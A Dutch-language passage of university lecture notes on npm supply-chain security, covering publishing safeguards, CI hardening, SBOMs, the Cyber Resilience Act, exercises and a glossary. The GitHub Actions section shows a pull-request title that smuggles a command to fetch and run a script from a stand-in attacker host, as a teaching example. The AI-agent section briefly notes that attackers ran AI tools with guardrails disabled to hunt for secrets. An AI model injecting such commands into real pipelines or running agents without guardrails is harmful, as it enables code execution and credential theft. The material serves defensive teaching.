*Kernvraag: hoe voorkom ik dat míjn package het wapen wordt?* Door een saai doelwit te zijn: geen 2FA die te phishen valt, geen tokens om te stelen, geen workflow die onvertrouwde invoer uitvoert. Ook als student ben je hier maintainer: zodra je een package publiceert of een CI-pipeline met secrets hebt.

### Je account: phishing-resistente 2FA

Bij chalk/debug, eslint-config-prettier en @solana/web3.js gaf de maintainer zijn TOTP-code aan een nepsite, die de code in realtime doorspeelde. **WebAuthn** (passkeys, hardwaresleutels, biometrie) werkt anders: de browser ondertekent een uitdaging die gebonden is aan het echte domein. Op `npmjs.help` levert je sleutel geen bruikbare handtekening op voor `npmjs.com`.

- npm laat sinds oktober 2025 geen nieuwe TOTP-configuraties meer toe en dwingt sinds december 2025 2FA standaard af voor nieuwe packages.
- Zet per package de instelling *Require two-factor authentication and disallow tokens* aan.
- npm vraagt je nooit per mail om je 2FA "bij te werken". Surf zelf naar de site in plaats van op een link te klikken, en lees het domein.
- Sinds juni 2026 zet npm accounts met veel impact 72 uur in alleen-lezenmodus na een wijziging van het e-mailadres. De aanvaller van axios veranderde precies dat.

### Geen langlevende tokens: trusted publishing

Met **trusted publishing** bewaar je geen npm-token meer in je CI. De pipeline vraagt aan GitHub een kortlevend OIDC-token dat zegt "ik ben workflow `release.yml` in repository X". npm controleert dat tegen de configuratie van je package en geeft eenmalig publicatierecht. Er is niets dat langer leeft dan één job, en dus niets dat een worm kan meenemen. Binnen die ene job is het token wel bruikbaar; daarom draait de code van je dependencies in een andere job (zie TanStack).

Trusted publishing is algemeen beschikbaar sinds 31 juli 2025 voor GitHub Actions en GitLab.com, en sinds april 2026 voor CircleCI. Het vereist npm 11.5.1 of hoger en werkt alleen op door het platform gehoste runners. Met `npm trust` (sinds npm 11.10) stel je het vanaf de opdrachtregel in.

```yaml
# .github/workflows/release.yml
name: release
on:
  release:
    types: [published]
permissions:
  contents: read
jobs:
  build:                            # draait dependency-code, maar mag niet publiceren
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<volledige-commit-sha>
        with:
          persist-credentials: false
      - uses: actions/setup-node@<volledige-commit-sha>
        with:
          node-version: 24
      - run: npm ci --ignore-scripts
      - run: npm test
      - run: npm pack
      - uses: actions/upload-artifact@<volledige-commit-sha>
        with:
          name: package
          path: '*.tgz'
  publish:
    needs: build
    runs-on: ubuntu-latest
    environment: npm-release        # vereist goedkeuring door een reviewer
    permissions:
      contents: read
      id-token: write               # alleen deze job mag een OIDC-token vragen
    steps:
      - uses: actions/setup-node@<volledige-commit-sha>
        with:
          node-version: 24
          registry-url: https://registry.npmjs.org
      - uses: actions/download-artifact@<volledige-commit-sha>
        with:
          name: package
      - run: npm publish ./*.tgz    # geen NPM_TOKEN; provenance automatisch
```

De workflow bestaat bewust uit twee jobs. De build-job voert de code van je dependencies en je tests uit, maar kan geen OIDC-token vragen. De publish-job krijgt alleen de gebouwde tarball en voert geen vreemde code uit. Controleer dat de npm-versie in de publish-job minstens 11.5.1 is.

Verwijder daarna alle oude tokens en kies *disallow tokens*. De les van axios: één vergeten token naast trusted publishing is genoeg.

### Staged publishing: een mens keurt elke release goed (verdieping)

TanStack toonde dat trusted publishing zelf misbruikt kan worden: wie code laat draaien in je release-pipeline, kan het OIDC-token gebruiken. Sinds 22 mei 2026 bestaat daarom **staged publishing**. CI voert `npm stage publish` uit, en de versie wordt pas installeerbaar nadat een maintainer ze met 2FA goedkeurt. Per trusted publisher kan je instellen dat alleen stagen toegelaten is. Vanaf ongeveer januari 2027 kunnen tokens die 2FA omzeilen alleen nog stagen, niet meer rechtstreeks publiceren.

### Provenance: wat het wel en niet bewijst (verdieping)

Met trusted publishing krijgt je package automatisch een **provenance-attestatie** (behalve voorlopig op CircleCI). Zonder trusted publishing voeg je `--provenance` toe aan `npm publish`; ook dat werkt alleen vanuit een ondersteund CI-platform met `id-token: write`, niet vanaf je laptop. Onder de motorkap gebruikt npm Sigstore: *Fulcio* geeft een kortlevend certificaat uit op basis van de OIDC-identiteit van de pipeline, en *Rekor* registreert de handtekening in een publiek transparantielog. Gebruikers verifiëren met `npm audit signatures`.

| Provenance bewijst | Provenance bewijst niet |
| --- | --- |
| uit welke repository en commit het package komt | dat de code in die commit onschuldig is |
| welke workflow het bouwde, op welk platform | dat die workflow niet gekaapt was (TanStack, ChainDrop) |
| dat de tarball sindsdien niet veranderd is | dat de maintainer te vertrouwen is |

Ook de koppeling zelf kan mislopen. In oktober 2026 werd *SlugFest* bekend: trusted publishing was gebonden aan de naam van een GitHub-repository in plaats van aan haar onveranderlijke ID, zodat wie een vrijgekomen repositorynaam claimde, onder bepaalde voorwaarden kon publiceren. GitHub voerde begin oktober een gedeeltelijke fix door.

### Je pipeline beveiligen

De meeste CI-aanvallen uit deel 4 begonnen met één patroon: een workflow die invoer van een buitenstaander als code behandelt, met krachtige rechten.

```yaml
# FOUT: pull_request_target draait met secrets en schrijfrechten,
# en de PR-titel wordt letterlijk in het shellscript geplakt.
on: pull_request_target
jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Titel: ${{ github.event.pull_request.title }}"
```

Een PR met als titel `"; curl https://evil.example/x.sh | sh; echo "` voert het script van de aanvaller uit, met toegang tot je secrets. Zo begon s1ngularity.

```yaml
# BETER: gewone pull_request-trigger, minimale rechten,
# en onvertrouwde invoer via een omgevingsvariabele.
on:
  pull_request:
    types: [opened, edited, synchronize, reopened]   # ook bij een gewijzigde titel
permissions:
  contents: read
jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Titel: $TITLE"
```

De regels die je moet kennen:

1. **Vermijd `pull_request_target`**, en voer onder die trigger nooit code uit een pull request uit. Nx, PostHog, Trivy en TanStack vielen hierdoor.
2. **Geef onvertrouwde invoer door via `env:`**, nooit via `${{ }}` in een `run:`-stap.
3. **Least privilege**: zet `permissions` standaard op `contents: read` en geef `id-token: write` alleen aan de publicatiejob.
4. **Pin Actions op een volledige commit-SHA**, niet op een tag. Bij tj-actions en Trivy werden bestaande tags gewoon verplaatst. GitHub kan SHA-pinning afdwingen via een beleid, en sinds 14 oktober 2026 bestaan workflow-lockfiles in public preview.
5. **Behandel de cache als invoer**: laat onvertrouwde triggers geen cache schrijven die je release-workflow leest.
6. **Bescherm publicatie met een environment** met verplichte reviewers, en geef elke environment alleen de secrets die ze nodig heeft.
7. **Roteer secrets in één keer** na een incident. Bij Trivy hield de aanvaller toegang omdat de rotatie gespreid verliep.
8. **Kijk mee**: `zizmor` analyseert workflows statisch op deze fouten, StepSecurity Harden-Runner bewaakt het netwerkverkeer van runners (zo werd tj-actions ontdekt). Laat je ook waarschuwen bij elke publicatie van je eigen packages: axios en TanStack hadden geen alarm bij een onverwachte publicatie.

**Kernpunt.** Als maintainer bescherm je niet alleen jezelf, maar iedereen die van je afhangt. Phishing-resistente 2FA, trusted publishing zonder tokens, staged publishing en een beveiligde pipeline maken van jouw package een saai doelwit.

## Deel 7 — Geavanceerd en vooruitblik (0:40–0:43)

*Kernvraag: waar gaat het ecosysteem naartoe?* Naar veilige standaardinstellingen, controleerbare builds en wettelijke verplichtingen. Dit deel geeft je de begrippen die je in je eerste job zal tegenkomen.

### SLSA: niveaus voor betrouwbare builds (verdieping)

**SLSA** (*Supply-chain Levels for Software Artifacts*, uitgesproken als "salsa") is een raamwerk van de OpenSSF. De huidige versie is v1.2 (november 2025), die naast de Build Track ook een Source Track invoert. De Build Track kent vier niveaus:

| Niveau | Wat het garandeert |
| --- | --- |
| Build L0 | niets |
| Build L1 | er bestaat provenance, maar die is makkelijk te vervalsen |
| Build L2 | een gehost build-platform ondertekent de provenance |
| Build L3 | geharde builds: runs zijn van elkaar geïsoleerd en stappen van gebruikers hebben geen toegang tot de ondertekeningssleutels |

Onthoud wat een hoger niveau wél en niet doet. De kwaadaardige TanStack-packages droegen geldige provenance van een gehost build-platform. SLSA beschermt tegen het *vervalsen* van provenance, niet tegen kwaadaardige *invoer* van een echte build, zoals een vergiftigde cache.

### SBOM: weten wat je draait

Een **Software Bill of Materials** is een machineleesbare lijst van alle componenten in je software, vergelijkbaar met de ingrediëntenlijst op een verpakking. De twee standaarden zijn **CycloneDX** (OWASP, versie 1.7, ook gestandaardiseerd als ECMA-424) en **SPDX** (Linux Foundation, ISO/IEC 5962:2021). npm maakt er sinds versie 10.2 zelf een:

```bash
npm sbom --sbom-format cyclonedx > sbom.json
```

De waarde zie je bij het volgende incident. Op 31 maart 2026 wilde elk securityteam binnen het uur weten: draaien wij ergens `axios@1.14.1`? Met een SBOM per product en een tool als OSV-Scanner is dat een zoekopdracht in plaats van een week werk.

### Runtime-isolatie: de schade beperken (verdieping)

Als kwaadaardige code toch draait, bepaalt de omgeving hoeveel schade ze kan doen.

- **Node.js-permissiemodel.** Met `node --permission` mag een proces standaard niets: geen bestandssysteem, geen netwerk (sinds Node 25), geen child processes, workers of native addons. Je geeft gericht toegang, bijvoorbeeld `--allow-fs-read=./data`. Het is stabiel sinds Node 22.13 en 23.5. De documentatie waarschuwt zelf dat het "geen garanties biedt in aanwezigheid van kwaadaardige code": zie het als een gordel, niet als een kooi. In januari 2026 werden nog omzeilingen via symlinks en Unix-sockets gedicht.
- **Deno** geeft standaard geen toegang tot I/O en voert npm-install-scripts alleen uit met `--allow-scripts`.
- **LavaMoat** gaat een stap verder en geeft elke dependency een eigen beleid. Een bibliotheek voor kleuren in de terminal heeft geen netwerk nodig, dus krijgt ze dat ook niet.
- **Scheiding in CI.** Installeer en test in een job zonder secrets; publiceer in een aparte job die alleen het gebouwde artefact krijgt.
- **Reproducible builds.** Als iedereen uit dezelfde broncode bit-voor-bit dezelfde tarball kan bouwen, kan iedereen ook nagaan of de gepubliceerde tarball klopt. Zo val je code op die alleen in de gepubliceerde tarball zit, zoals de geminificeerde payload van event-stream.

### AI-agents: nieuwe deelnemers in de keten

Codeassistenten kiezen dependencies, schrijven workflows en voeren commando's uit. De casestudies en recente incidenten tonen drie risico's:

- **Ze worden ingezet als gereedschap**: s1ngularity liet lokale AI-tools met uitgeschakelde vangrails naar secrets zoeken.
- **Ze worden een schuilplaats**: de wormen van 2026 nestelden zich in de configuratie van AI-assistenten, en SANDWORM\_MODE installeerde een kwaadaardige MCP-server (een plug-in die een AI-assistent extra tools geeft).
- **Ze verzinnen namen**: begin 2026 verspreidde de verzonnen naam `react-codeshift` zich via gegenereerde "Agent Skills" naar 237 repositories. Een onderzoeker van Aikido registreerde de naam defensief, en nog steeds installeren agents het package een paar keer per dag.

Behandel een agent als een nieuwe collega die je nog niet kent: minimale rechten, een sandbox, menselijke bevestiging voor installaties en een review van alles wat hij aan CI verandert. Een MCP-server is een dependency als een andere en verdient dezelfde controle.

### Regelgeving: de Cyber Resilience Act

De Europese **Cyber Resilience Act** (Verordening (EU) 2024/2847) is in werking sinds 10 december 2024 en maakt supply chain security voor het eerst een wettelijke plicht voor fabrikanten van producten met digitale elementen die in de EU verkocht worden.

| Datum | Wat geldt er |
| --- | --- |
| 10 december 2024 | inwerkingtreding |
| 11 juni 2026 | regels voor aangemelde instanties (hoofdstuk IV) |
| 11 september 2026 | meldplicht voor actief uitgebuite kwetsbaarheden en ernstige incidenten: waarschuwing binnen 24 uur, melding binnen 72 uur, eindrapport binnen 14 dagen (kwetsbaarheid) of een maand (incident), via het meldplatform van ENISA |
| 11 december 2027 | volledige toepassing |

Voor dit college zijn drie punten belangrijk. Fabrikanten moeten een SBOM opstellen die minstens de directe dependencies dekt. Ze moeten zorgvuldig omgaan met componenten van derden, ook open source. En de wet introduceert de **open-source software steward**: een organisatie, zoals een stichting, die open source structureel ondersteunt voor commercieel gebruik. Zij krijgt een lichter regime zonder boetes. Wie als hobbyist zonder commerciële activiteit publiceert, valt grotendeels buiten de verplichtingen.

In de Verenigde Staten zette het presidentiële uitvoeringsbesluit (executive order) 14028 (mei 2021) de SBOM al op de agenda voor leveranciers van de overheid.

### Waar gaat het naartoe?

De grootste verschuiving van 2026 is dat veiligheid de standaard wordt: npm 12, pnpm 11 en Yarn 4.15 blokkeren install scripts, pnpm en Yarn houden nieuwe versies standaard een dag tegen (bij npm zet je dat zelf aan), de registry scant elke publicatie, en staged publishing brengt een mens terug in de lus. Aanvallers verschuiven daarom naar wat die standaarden niet dekken: code die pas bij `import` draait, CI-pipelines, misbruik van trusted publishing en, vooral, de mens achter het account.

> **Voor de docent.** Sluit dit deel af met de vraag: "Welke maatregel uit deel 5 of 6 zou de Noord-Koreaanse aanval op axios hebben tegengehouden, als de aanvaller de laptop van de maintainer al controleerde?" Antwoord: aan maintainerkant alleen tokens verbieden, zodat elke (klaargezette) publicatie een fysieke bevestiging met een hardwaresleutel vraagt; aan gebruikerskant de cooldown en het blokkeren van install scripts.

**Kernpunt.** De volgende stap in supply chain security is aantoonbaarheid: weten wat je draait (SBOM), kunnen bewijzen hoe het gebouwd is (provenance, SLSA) en de schade kunnen beperken als het misgaat (isolatie). De Cyber Resilience Act maakt een deel daarvan verplicht: de meldplicht sinds september 2026, de SBOM vanaf december 2027.

## Afsluiting en vragen (0:43–0:45)

De kernboodschap past in drie zinnen:

1. **Je vertrouwt veel meer mensen dan je denkt**: wie `express` installeert, vertrouwt 36 accounts, en elk daarvan kan gephisht worden.
2. **Aanvallers richten zich op die mensen, hun accounts en hun pipelines**, en ze worden in tien jaar steeds sneller, gerichter en professioneler.
3. **Je kan je goed beschermen met een handvol saaie maatregelen in lagen**, en een groot deel ervan staat sinds 2026 standaard aan, als je je tools up-to-date houdt (de cooldown in npm zet je nog zelf aan).

### Checklist voor je volgende project

Als gebruiker van packages:

- [ ] `package-lock.json` staat in Git en CI installeert met `npm ci`.
- [ ] Je gebruikt npm 12, pnpm 11 of Yarn 4.15 (of minstens `ignore-scripts=true`), met een korte, gereviewde allowlist van install scripts.
- [ ] Nieuwe versies krijgen een cooldown van minstens één dag, liefst drie tot zeven, ook in Dependabot of Renovate.
- [ ] Interne packages staan onder een eigen scope die vast aan je interne registry gekoppeld is.
- [ ] Naast `npm audit` draait een tool die gedrag analyseert of gekende malware blokkeert.
- [ ] Elke release krijgt een SBOM (`npm sbom`).
- [ ] Er staan geen langlevende tokens of productiecredentials op ontwikkelmachines, en onbekende code draait in een container.
- [ ] AI-agents draaien met hun vangrails aan, en wijzigingen aan `.claude/` en `.vscode/` worden gereviewd.

Als maintainer:

- [ ] 2FA met een passkey of hardwaresleutel, geen TOTP.
- [ ] Trusted publishing, alle oude tokens verwijderd, *disallow tokens* aan.
- [ ] Staged publishing of een environment met een verplichte reviewer voor elke release.
- [ ] Workflows zonder `pull_request_target`, met minimale `permissions` en Actions gepind op commit-SHA, gecontroleerd met `zizmor`.
- [ ] Een melding bij elke publicatie van je packages.

> **Voor de docent.** Toon de checklist als laatste slide en laat ze openstaan tijdens de vragen. Verwijs voor de verwerking naar oefening 1 (inventaris van een eigen project) en oefening 3 (een repository beveiligen).

## Discussievragen en oefeningen

De oefeningen zijn bedoeld voor na het college of voor een werkzitting; de discussievragen kan je ook tijdens het college gebruiken als je tijd over hebt.

### Discussievragen

1. De maintainers van colors en node-ipc saboteerden hun eigen code. Was dat hun recht? Wie "bezit" een open-sourcepackage waarop miljoenen projecten bouwen?
2. De overnames van event-stream en xz-utils begonnen bij een uitgeputte, onbetaalde maintainer. Wie zou moeten betalen voor de veiligheid van open source: gebruikers, bedrijven, overheden of de registry?
3. npm 12 schakelt install scripts van dependencies sinds juli 2026 standaard uit; pnpm deed dat al in januari 2025. Waarom duurde die stap bij npm zo lang? Wat breekt er, en wie draagt die kost?
4. Een cooldown van zeven dagen houdt de meeste kwaadaardige versies tegen. Maar wat met een dringende securitypatch die je vandaag nodig hebt? Hoe zou jij die afweging organiseren?
5. AI-codeassistenten stellen packages voor en installeren ze soms zelf. Welke nieuwe risico's ontstaan daardoor, en welke vangrails zou je inbouwen?
6. Provenance bewijst uit welke commit een package gebouwd werd. Waarom is dat geen bewijs dat het package veilig is?

### Oefening 1 — Inventaris van je eigen project (30 min)

Neem een Node.js-project dat je eerder schreef en beantwoord:

- Hoeveel directe en hoeveel transitieve dependencies heeft het? (`npm ls --all`)
- Welke packages hebben een install script dat je nog niet goedkeurde, en dat npm 12 dus zou overslaan? Op npm 11.18 of nieuwer toont `npm install-scripts ls` die lijst, op 11.16 en 11.17 `npm approve-scripts --allow-scripts-pending`. Op oudere versies gebruik je bijvoorbeeld:

```bash
node -e "const l=require('./package-lock.json');for(const[k,v]of Object.entries(l.packages))if(v.hasInstallScript)console.log(k)"
```

- Hoeveel verschillende maintainers vertrouw je? `npm view <package> maintainers` toont ze voor één package; schrijf een kort script dat alle packages uit de lockfile overloopt en de unieke namen telt.
- Welke dependency zou je kunnen schrappen of door een paar regels eigen code vervangen?

### Oefening 2 — Incidentanalyse (1 pagina)

Kies een incident uit deel 4 dat je niet in detail besproken zag en analyseer het met de vier vragen uit deel 3: toegang, verspreiding, payload, detectie en respons. Benoem daarna drie maatregelen uit deel 5 en 6 die het incident hadden gestopt of afgezwakt, en één maatregel die *niet* had geholpen, met uitleg waarom.

### Oefening 3 — Een repository beveiligen (praktisch)

Maak een kleine GitHub-repository met een Node.js-project en voer de checklist uit de afsluiting uit: `npm ci` in CI, install scripts standaard uit met een allowlist, een cooldown op nieuwe versies, een scope-configuratie in `.npmrc`, en GitHub Actions die op commit-SHA gepind zijn met minimale `permissions`. Laat een medestudent je repository reviewen.

### Oefening 4 — Trusted publishing en provenance (praktisch)

Publiceer een scoped testpackage (`@jouwnaam/hello-supply-chain`) vanuit GitHub Actions met trusted publishing, zonder npm-token in je secrets. Controleer daarna in een ander project met `npm audit signatures` dat de provenance geverifieerd wordt, en zoek de bijhorende entry op in het publieke Sigstore-transparantielog.

Je hebt daarvoor een npm-account met 2FA nodig. Laat npm je voor een nieuw package nog geen trusted publisher instellen, publiceer dan eerst één versie manueel met 2FA en schakel daarna over.

### Oefening 5 — Dependency confusion in een lab (gevorderd)

Zet met [Verdaccio](https://verdaccio.org/) twee lokale registries op: een "publieke" en een "interne" die de publieke als *uplink* gebruikt, zoals een proxy-registry in een bedrijf. Publiceer `acme-auth@1.0.0` op de interne registry en daarna `acme-auth@99.0.0` op de "publieke". Toon aan dat een installatie via de interne registry de hogere versie van de "publieke" oplevert zolang de proxy ook voor interne namen de uplink raadpleegt. Toon daarna dat een eigen scope, met een proxy die die scope nooit upstream opzoekt en een vaste koppeling in `.npmrc`, dat verhindert. Werk uitsluitend lokaal: publiceer nooit testpackages met andermans namen op de echte registry.

## Begrippenlijst

| Begrip | Betekenis |
| --- | --- |
| Accountovername | Een aanvaller krijgt controle over het account van een maintainer en kan zo in diens naam publiceren. |
| Advisory | Een publieke melding van een kwetsbaarheid: welke versies getroffen zijn, hoe ernstig ze is en welke versie de fout oplost, zoals GHSA-xvch-5gv4-984h voor minimist. |
| Attestatie | Een ondertekende, controleerbare verklaring over een artefact, bijvoorbeeld "dit package is gebouwd uit commit X in workflow Y". |
| binding.gyp | Het bouwrecept van een native addon. Heeft een package met zo’n bestand geen eigen install script, dan voert npm automatisch node-gyp rebuild uit. |
| Blast radius | Hoeveel systemen of gebruikers geraakt worden als één onderdeel gecompromitteerd raakt. |
| Cooldown (minimum release age) | Een instelling die nieuwe versies pas installeert als ze een minimum aantal uren of dagen oud zijn. |
| Crypto-clipper / drainer | Malware die cryptoadressen vervangt of wallets leegmaakt. |
| CVE | Common Vulnerabilities and Exposures: een unieke code voor een publiek bekende kwetsbaarheid, zoals CVE-2022-23812 voor node-ipc. |
| Dependency confusion | Een aanvaller publiceert de naam van een intern package publiek met een hoger versienummer, zodat een verkeerd ingestelde proxy-registry de publieke versie levert. |
| Directe en transitieve dependency | Direct: staat in je eigen `package.json`. Transitief: een dependency van een dependency. |
| Dist-tag | Een label zoals `latest` dat naar een bepaalde versie van een package wijst. |
| Exfiltratie | Het ongemerkt wegsluizen van gestolen gegevens naar een systeem van de aanvaller. |
| Install script | Een lifecycle script dat bij de installatie draait: `preinstall`, `install` of `postinstall`. |
| Integrity-hash | Een cryptografische hash (SHA-512) in de lockfile waarmee npm controleert of een tarball niet veranderd is. |
| Least privilege | Elk onderdeel krijgt alleen de rechten die het strikt nodig heeft. |
| Lifecycle script | Een script in `package.json` (`preinstall`, `install`, `postinstall`, `prepare`) dat npm automatisch uitvoert. |
| Lockfile | `package-lock.json`: legt exacte versies, bron-URL's en integrity-hashes van de hele boom vast. |
| Maintainer | Iemand met publicatierechten op een package. |
| MCP-server | Een plug-in volgens het Model Context Protocol die een AI-assistent extra tools en gegevens geeft. |
| Native addon | Een module in C of C++, door node-gyp gecompileerd tot een .node-bestand dat Node.js met require() laadt. |
| OIDC | OpenID Connect: een standaard waarmee een CI-systeem kortlevende, verifieerbare identiteitstokens uitgeeft. |
| Payload | Het deel van de malware dat de eigenlijke schade doet, zoals secrets stelen of adressen vervangen. |
| Persistentie | Technieken waarmee malware zich nestelt, zodat ze later of na een herstart opnieuw draait. |
| Phishing-resistente 2FA | Tweede factor die gebonden is aan het echte domein (WebAuthn, passkeys, hardwaresleutels), zodat een nepwebsite ze niet kan doorgeven. TOTP-codes zijn wél te phishen. |
| Pinning | Een exacte versie vastleggen; bij GitHub Actions: verwijzen naar een volledige commit-SHA in plaats van een tag. |
| Protestware | Software die de eigen maintainer opzettelijk saboteert om een politiek of persoonlijk statement te maken. |
| Provenance | Een attestatie die aantoont uit welke broncode en welke build een npm-package voortkomt. |
| Proxy-registry | Een registry die interne packages en een publieke registry samenvoegt tot één bron, zoals Verdaccio of Artifactory. |
| Registry | De centrale server waar packages gepubliceerd en gedownload worden, bij npm `registry.npmjs.org`. |
| Reproducible build | Een build die uit dezelfde broncode bit-voor-bit hetzelfde resultaat geeft, zodat iedereen het kan nacontroleren. |
| SBOM | Software Bill of Materials: een machineleesbare lijst van alle componenten in een stuk software (formaten: CycloneDX, SPDX). |
| SCA | Software Composition Analysis: tooling die je dependencies analyseert op gekende kwetsbaarheden, licenties en malware. |
| Scope | Een namespace voor packages (`@org/naam`) die aan één gebruiker of organisatie toebehoort. |
| Self-hosted runner | Een eigen machine die GitHub Actions-workflows uitvoert, in plaats van een machine van GitHub. |
| Semver | Semantic versioning, `MAJOR.MINOR.PATCH`, met ranges zoals `^` en `~`. |
| Sigstore | Open infrastructuur om software te ondertekenen met kortlevende certificaten en een publiek transparantielog. |
| SLSA | Supply-chain Levels for Software Artifacts: een raamwerk met niveaus voor hoe betrouwbaar een build-proces is. |
| Slopsquatting | Packages registreren onder namen die AI-assistenten verzinnen. |
| Software supply chain | Alle code, mensen, accounts, tools en infrastructuur die tussen andermans broncode en jouw draaiende software zitten. |
| Staged publishing | Publiceren in twee stappen: CI zet een versie klaar, een maintainer keurt ze met 2FA goed voor ze installeerbaar wordt. |
| Tarball | Het gecomprimeerde archief (`.tgz`) waarin een npm-package verspreid wordt. |
| Token (npm) | Een geheime sleutel waarmee de CLI of een pipeline zich aanmeldt bij de registry; wie het token heeft, kan publiceren. |
| TOTP | Time-based One-Time Password: de zescijferige code uit een authenticator-app. Handig, maar te phishen. |
| Trusted publishing | Publiceren vanuit CI met een kortlevend OIDC-token in plaats van een opgeslagen npm-token. |
| Typosquatting | Een package registreren onder een naam die bijna gelijk is aan die van een populair package. |
| Worm | Malware die zichzelf verspreidt, hier door met gestolen tokens nieuwe besmette versies te publiceren. |

## Bronnen

Alle feiten en cijfers in deze tekst komen uit de onderstaande pagina's, geraadpleegd op 19 oktober 2026. De meting van express (65 packages, 36 maintainers) is een eigen meting op die datum met `npm install express` (versie 5.3.0) en de API van de npm-registry.

### Incidenten 2016–2024

- left-pad: [npm-blog over kik, left-pad en npm](https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm) · [huidig unpublish-beleid](https://docs.npmjs.com/policies/unpublish)
- crossenv: [npm-blog over de crossenv-malware](https://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry)
- eslint-scope: [postmortem van ESLint](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/)
- event-stream: [npm-blog](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident) · [postmortem van Snyk](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/) · [GitHub-issue #116](https://github.com/dominictarr/event-stream/issues/116)
- Dependency confusion: [Alex Birsan, "Dependency Confusion"](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) · [BleepingComputer](https://www.bleepingcomputer.com/news/security/researcher-hacks-over-35-tech-firms-in-novel-supply-chain-attack/)
- ua-parser-js: [CISA-alert](https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js) · [Rapid7](https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know)
- coa en rc: [GitHub-advisory coa](https://github.com/advisories/GHSA-73qr-pfmq-6rp8) · [GitHub over verplichte 2FA](https://github.blog/2021-11-15-githubs-commitment-to-npm-ecosystem-security/)
- colors en faker: [Snyk](https://snyk.io/blog/open-source-npm-packages-colors-faker/)
- node-ipc (2022): [Snyk](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/) · [GitHub-advisory](https://github.com/advisories/GHSA-97m3-w2cp-4xx6)
- Manifest confusion: [Darcy Clarke](https://www.vlt.io/blog/the-massive-hole-in-the-npm-ecosystem)
- polyfill.io: [Sansec](https://sansec.io/research/polyfill-supply-chain-attack)
- xz-utils: [melding op oss-security](https://www.openwall.com/lists/oss-security/2024/03/29/4) · [tijdlijn van Russ Cox](https://research.swtch.com/xz-timeline)
- @lottiefiles/lottie-player: [Wiz](https://www.wiz.io/blog/lottie-player-supply-chain-attack)
- @solana/web3.js: [GitHub-advisory](https://github.com/advisories/GHSA-jcxm-7wvp-g6p5) · [analyse van Anza](https://www.anza.xyz/blog/web3-js-exploit-root-cause-analysis)
- @rspack/core: [release-notes v1.1.8](https://github.com/web-infra-dev/rspack/releases/tag/v1.1.8)
- Contagious Interview: [Unit 42 (2023)](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/) · [Socket (2025)](https://socket.dev/blog/north-korea-contagious-interview-campaign-338-malicious-npm-packages)

### Incidenten 2025

- tj-actions/changed-files: [Unit 42](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/) · [Endor Labs](https://www.endorlabs.com/learn/blast-radius-of-the-tj-actions-changed-files-supply-chain-attack) · [CISA](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066)
- eslint-config-prettier en is: [Endor Labs](https://www.endorlabs.com/learn/cve-2025-54313-eslint-config-prettier-compromise----high-severity-but-windows-only) · [Socket](https://socket.dev/blog/npm-is-package-hijacked-in-expanding-supply-chain-attack)
- Nx s1ngularity: [GitHub-advisory van Nx](https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c) · [postmortem van Nx](https://nx.dev/blog/s1ngularity-postmortem) · [GitGuardian](https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/) · [Snyk](https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/) · [Wiz](https://www.wiz.io/blog/s1ngularity-supply-chain-attack)
- chalk en debug: [Aikido](https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised) · [Socket](https://socket.dev/blog/npm-author-qix-compromised-in-major-supply-chain-attack) · [Security Alliance](https://radar.securityalliance.org/2025-09-npm-supply-chain) · [Wiz](https://www.wiz.io/blog/widespread-npm-supply-chain-attack-breaking-down-impact-scope-across-debug-chalk) · [Amazon Threat Intelligence over de toeschrijving](https://aws.amazon.com/blogs/security/amazon-identifies-north-korean-hacker-group-behind-open-source-supply-chain-attacks/) · [DuckDB-advisory](https://github.com/duckdb/duckdb-node/security/advisories/GHSA-w62p-hx95-gf2c)
- Shai-Hulud: [Wiz](https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack) · [Socket](https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages) · [StepSecurity](https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised) · [CISA](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem)
- Shai-Hulud 2.0: [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/) · [Wiz](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack) · [postmortem van PostHog](https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem)
- PhantomRaven: [BleepingComputer](https://bleepingcomputer.com/news/security/phantomraven-attack-floods-npm-with-credential-stealing-packages)

### Incidenten 2026

- axios: [postmortem van de maintainer](https://github.com/axios/axios/issues/10636) · [Google Threat Intelligence](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package) · [StepSecurity](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan) · [CISA-alert van 20 april 2026](https://content.govdelivery.com/accounts/USDHSCISA/bulletins/413c7a5)
- TeamPCP en Trivy: [Trivy-advisory](https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23) · [Wiz](https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack) · [Aikido over CanisterWorm](https://www.aikido.dev/blog/teampcp-deploys-worm-npm-trivy-compromise)
